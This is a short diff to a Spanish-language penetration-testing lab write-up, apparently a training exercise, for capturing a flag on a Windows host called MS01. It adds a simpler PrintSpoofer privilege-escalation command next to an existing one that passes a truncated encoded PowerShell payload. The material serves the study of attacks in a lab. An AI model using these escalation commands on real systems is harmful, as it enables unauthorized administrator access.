@@ -253,6 +253,10 @@ Nuestra máquina $target `10.129.34.149`, tiene otra interfaz: `172.16.7.240`
         ```poweshell
         .\printspoofer.exe -c "powershell -e JABjAGwA..." 
         ```
+        Era más fácil elevar: 
+		```powershell
+		.\PrintSpoofer64.exe -i -c powershell
+		```
 
 ###  Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
 
